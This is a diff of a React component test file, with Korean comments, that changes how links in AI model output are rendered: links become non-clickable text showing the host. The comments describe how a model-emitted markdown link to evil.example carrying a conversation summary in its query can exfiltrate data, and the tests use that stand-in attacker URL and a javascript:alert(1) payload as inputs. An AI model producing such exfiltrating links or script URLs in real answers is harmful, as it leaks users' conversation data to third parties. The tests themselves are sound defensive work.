@@ -294,8 +294,9 @@ describe('MessageList', () => {
         />,
       )
       expect(container.querySelector('img, script')).toBeNull()
-      const link = screen.getByText('누르기').closest('a')
-      expect(link?.getAttribute('href') ?? '').not.toMatch(/javascript:/i)
+      expect(container.querySelector('a')).toBeNull()
+      expect(screen.getByText('누르기')).toBeInTheDocument()
+      expect(container.textContent).not.toMatch(/javascript:/i)
     })
 
     // 그리면 모델 출력에 실린 바깥 주소를 브라우저가 곧바로 불러 쿼리로 값이 새어 나갈 수 있다(#359)
@@ -317,7 +318,27 @@ describe('MessageList', () => {
       )
       expect(container.querySelector('img')).toBeNull()
       expect(screen.getByText(/결선도 요약/)).toBeInTheDocument()
-      expect(screen.getByRole('link', { name: '배지' })).toHaveAttribute('href', 'https://e.example/x')
+      expect(screen.getByText(/배지/)).toBeInTheDocument()
+    })
+
+    // 모델이 `[자세히](https://evil.example/?q=<대화 요약>)` 를 내면 한 번 클릭으로 값이 새므로 누를 수 없는 글자로 낮춘다(#414)
+    it('답변 속 링크는 누를 수 없는 글자와 호스트로 그린다', () => {
+      const { container } = render(
+        <MessageList messages={[msg('assistant', '[x](https://evil.example/?q=1)')]} />,
+      )
+      expect(container.querySelector('a')).toBeNull()
+      expect(container.querySelector('p')?.textContent).toBe('x (evil.example)')
+    })
+
+    it('호스트를 못 읽는 링크는 글자만 그린다', () => {
+      const { container } = render(
+        <MessageList
+          messages={[msg('assistant', '[상대](/docs/a)\n\n[스킴](javascript:alert(1))\n\n[메일](mailto:a@b.example)')]}
+        />,
+      )
+      expect(container.querySelector('a')).toBeNull()
+      const texts = Array.from(container.querySelectorAll('p')).slice(0, 3).map((p) => p.textContent)
+      expect(texts).toEqual(['상대', '스킴', '메일'])
     })
 
     it('그림 표식 앞뒤의 마크다운과 그림이 함께 나온다', async () => {
